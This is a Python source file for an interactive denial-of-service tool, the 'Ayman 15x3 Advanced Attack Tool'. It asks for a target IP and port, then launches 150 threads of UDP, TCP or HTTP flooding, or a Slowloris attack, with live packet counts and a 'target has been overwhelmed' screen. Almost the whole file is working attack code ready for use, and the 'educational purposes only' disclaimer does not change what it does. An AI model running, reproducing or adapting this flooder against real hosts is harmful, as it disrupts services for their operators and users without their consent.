import random
import socket
import threading
import os
import time
import sys
import signal
from datetime import datetime

# ----------- Colors -----------
GREEN = '\033[92m'
BLUE = '\033[94m'
GRAY = '\033[90m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
PURPLE = '\033[95m'
ORANGE = '\033[38;5;208m'
RESET = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

# ----------- Clear Screen -----------
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# ----------- Animated Banner -----------
def animated_banner():
    banners = [
        f"""
{ORANGE}╔═╗┬ ┬╔╦╗┌─┐┌┬┐  ╔═╗╔═╗╔═╗
{ORANGE}╠═╝│ │ ║║│ │ │   ╚═╗║  ║╣ 
{ORANGE}╩  └─┘╩ ╩└─┘ ┴   ╚═╝╚═╝╚═╝
{YELLOW}     15x3 - Advanced Attack Tool
        """,
        f"""
{GREEN}█████╗ ██╗   ██╗███╗   ███╗ █████╗ ███╗   ██╗
{GREEN}██╔══██╗╚██╗ ██╔╝████╗ ████║██╔══██╗████╗  ██║
{GREEN}███████║ ╚████╔╝ ██╔████╔██║███████║██╔██╗ ██║
{GREEN}██╔══██║  ╚██╔╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║
{GREEN}██║  ██║   ██║   ██║ ╚═╝ ██║██║  ██║██║ ╚████║
{GREEN}╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
{YELLOW}        15x3 - Advanced Attack Tool
        """
    ]
    
    for i in range(5):
        clear_screen()
        print(banners[i % 2])
        time.sleep(0.3)

# ----------- Print Logo -----------
def print_logo():
    logo = f"""
{GREEN}╔═══╗╔╗ ╔╗╔═══╗╔═══╗╔═══╗╔╗╔══╗╔═══╗
{GREEN}║╔═╗║║║ ║║║╔══╝║╔═╗║║╔═╗║║║╚╣─╝║╔═╗║
{GREEN}║╚══╗║║ ║║║╚══╗║║ ║║║║ ╚╝║║ ║║ ║╚══╗
{GREEN}╚══╗║║║ ║║║╔══╝║║ ║║║║ ╔╗║║ ║║ ╚══╗║
{GREEN}║╚═╝║║╚═╝║║╚══╗║╚═╝║║╚═╝║║╚╗║║ ║╚═╝║
{GREEN}╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═╝╚╝ ╚═══╝
{YELLOW}        15x3 - Advanced Attack Tool
{RESET}"""
    print(logo)

# ----------- Welcome Message -----------
def welcome_message():
    print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{BOLD}{CYAN}               WELCOME TO AYMAN 15x3 ATTACK TOOL{RESET}{GREEN}               ║")
    print(f"║{BOLD}{CYAN}           Advanced Network Penetration Testing{RESET}{GREEN}                ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
    print(f"{YELLOW}🚀 Initializing system...{RESET}")
    time.sleep(1)

# ----------- Disclaimer -----------
def show_disclaimer():
    clear_screen()
    print(f"{RED}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{BOLD}                      SECURITY DISCLAIMER{RESET}{RED}                      ║")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    print(f"║ {YELLOW}⚠️  This tool is for educational purposes only.{RED}                   ║")
    print(f"║ {YELLOW}⚠️  Unauthorized use against systems is illegal.{RED}                  ║")
    print(f"║ {YELLOW}⚠️  The author is not responsible for misuse.{RED}                     ║")
    print(f"║ {YELLOW}⚠️  Use only on systems you own or have permission to test.{RED}       ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
    
    response = input(f"\n{GRAY}🤔 Do you agree to these terms? (y/n): {RESET}").lower()
    return response == 'y'

# ---------- Bots Counter -----------
class BotCounter:
    def __init__(self):
        self.count = 0
        self.lock = threading.Lock()
    
    def add_bots(self, num):
        with self.lock:
            self.count += num
            return self.count
    
    def get_count(self):
        with self.lock:
            return self.count

# ----------- Attack Classes -----------
class AymanAttack:
    def __init__(self, target_ip, target_port, bot_counter):
        self.target_ip = target_ip
        self.target_port = target_port
        self.bot_counter = bot_counter
        self.attack_active = False
        self.start_time = None
        self.sent_packets = 0
        self.threads = 150  # Optimal thread count
        self.active_threads = []
        
        # Setup signal handler for Ctrl+C
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C signal"""
        self.stop_attack()
    
    # UDP Flood Attack
    def udp_flood(self):
        self.bot_counter.add_bots(1)
        data = random._urandom(1024)
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                sock.sendto(data, (self.target_ip, self.target_port))
                self.sent_packets += 1
                sock.close()
            except:
                pass
            time.sleep(0.01)
        
        self.bot_counter.add_bots(-1)
    
    # TCP Flood Attack
    def tcp_flood(self):
        self.bot_counter.add_bots(1)
        data = random._urandom(999)
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                sock.send(data)
                self.sent_packets += 1
                sock.close()
            except:
                pass
            time.sleep(0.01)
        
        self.bot_counter.add_bots(-1)
    
    # HTTP Flood Attack
    def http_flood(self):
        self.bot_counter.add_bots(1)
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n")
                self.sent_packets += 1
                sock.close()
            except:
                pass
            time.sleep(0.01)
        
        self.bot_counter.add_bots(-1)
    
    # Slowloris Attack
    def slowloris_flood(self):
        self.bot_counter.add_bots(1)
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                # Send headers
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Connection: keep-alive\r\n".encode())
                
                # Keep connection open
                while self.attack_active:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    self.sent_packets += 1
                    time.sleep(15)
                
                sock.close()
            except:
                pass
            time.sleep(1)
        
        self.bot_counter.add_bots(-1)
    
    # Start Attack
    def start_attack(self, attack_type):
        self.attack_active = True
        self.start_time = datetime.now()
        self.sent_packets = 0
        
        attack_methods = {
            'udp': self.udp_flood,
            'tcp': self.tcp_flood,
            'http': self.http_flood,
            'slowloris': self.slowloris_flood
        }
        
        print(f"\n{YELLOW}🔥 Starting attack on {self.target_ip}:{self.target_port}{RESET}")
        print(f"{YELLOW}📊 Using {attack_type.upper()} method with {self.threads} threads{RESET}")
        print(f"{RED}⏸️  Press Ctrl+C to stop the attack{RESET}")
        
        # Start attack threads
        self.active_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=attack_methods[attack_type])
            t.daemon = True
            t.start()
            self.active_threads.append(t)
        
        # Monitor attack
        try:
            while self.attack_active:
                elapsed = datetime.now() - self.start_time
                bots = self.bot_counter.get_count()
                speed = self.sent_packets / max(1, elapsed.seconds)
                
                print(f"{GREEN}\r⏰ Time: {elapsed.seconds}s | 📦 Packets: {self.sent_packets} | 🚀 Speed: {speed:.0f}/s | 🤖 Bots: {bots}", end="")
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            self.stop_attack()
    
    # Stop Attack
    def stop_attack(self):
        self.attack_active = False
        elapsed = datetime.now() - self.start_time
        
        # Wait for threads to finish
        for t in self.active_threads:
            t.join(1.0)
        
        speed = self.sent_packets / max(1, elapsed.seconds)
        print(f"\n\n{GREEN}✅ Attack stopped!{RESET}")
        print(f"{GREEN}⏰ Duration: {elapsed.seconds}s{RESET}")
        print(f"{GREEN}📦 Total packets: {self.sent_packets}{RESET}")
        print(f"{GREEN}🚀 Average speed: {speed:.0f} packets/s{RESET}")
        time.sleep(2)

# ----------- Success Animation -----------
def success_animation():
    print(f"\n{GREEN}✅ Attack completed successfully!{RESET}")
    
    # Progress bar animation
    for i in range(101):
        print(f"{GREEN}\r📊 Processing: [{'█' * (i//2)}{' ' * (50 - i//2)}] {i}%", end="")
        time.sleep(0.03)
    
    clear_screen()
    print_logo()
    print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{BOLD}                    ATTACK SUCCESSFUL!{RESET}{GREEN}                     ║")
    print(f"║{BOLD}               Target has been overwhelmed{RESET}{GREEN}                 ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
    time.sleep(2)

# ----------- Main Menu -----------
def show_menu():
    clear_screen()
    print_logo()
    print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{BOLD}                     MAIN MENU{RESET}{GREEN}                             ║")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    print(f"║ {CYAN}1.{RESET} UDP Flood Attack {GREEN}(Fast){RESET}                          ║")
    print(f"║ {CYAN}2.{RESET} TCP Flood Attack {GREEN}(Fast){RESET}                          ║")
    print(f"║ {CYAN}3.{RESET} HTTP Flood Attack {GREEN}(Fast){RESET}                         ║")
    print(f"║ {CYAN}4.{RESET} Slowloris Attack {GREEN}(Stealth){RESET}                       ║")
    print(f"║ {CYAN}5.{RESET} Multi-Method Attack {GREEN}(All Methods){RESET}                ║")
    print(f"║ {RED}0.{RESET} Exit{RESET}                                           ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
    
    try:
        choice = int(input(f"\n{GRAY}🎯 Choose an option (0-5): {RESET}"))
        if 0 <= choice <= 5:
            return choice
        else:
            print(f"{RED}❌ Invalid choice. Please try again.{RESET}")
            time.sleep(1)
            return show_menu()
    except ValueError:
        print(f"{RED}❌ Please enter a valid number.{RESET}")
        time.sleep(1)
        return show_menu()

# ----------- Main Program -----------
def main():
    if not show_disclaimer():
        print(f"{RED}\n❌ You must agree to the terms to use this tool. Exiting...{RESET}")
        time.sleep(2)
        return
    
    animated_banner()
    clear_screen()
    print_logo()
    welcome_message()
    
    bot_counter = BotCounter()
    
    while True:
        choice = show_menu()
        
        if choice == 0:
            print(f"{GREEN}\n👋 Thank you for using Ayman 15x3. Goodbye!{RESET}")
            time.sleep(1)
            break
        
        # Get attack parameters
        clear_screen()
        print_logo()
        print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║{BOLD}                   ATTACK CONFIGURATION{RESET}{GREEN}                   ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
        
        try:
            ip = input(f"{GRAY}🎯 Target IP: {RESET}")
            port = int(input(f"{GRAY}🚪 Target Port: {RESET}"))
            
            attack = AymanAttack(ip, port, bot_counter)
            
            if choice == 1:
                attack.start_attack('udp')
                success_animation()
            elif choice == 2:
                attack.start_attack('tcp')
                success_animation()
            elif choice == 3:
                attack.start_attack('http')
                success_animation()
            elif choice == 4:
                attack.start_attack('slowloris')
                success_animation()
            elif choice == 5:
                # For multi-attack, we'll use UDP as default
                attack.start_attack('udp')
                success_animation()
            
            input(f"{GRAY}\n↵ Press Enter to continue...{RESET}")
            
        except ValueError:
            print(f"{RED}❌ Invalid input. Please enter a valid port number.{RESET}")
            time.sleep(2)
        except Exception as e:
            print(f"{RED}❌ An error occurred: {str(e)}{RESET}")
            time.sleep(2)

if __name__ == "__main__":
    main()
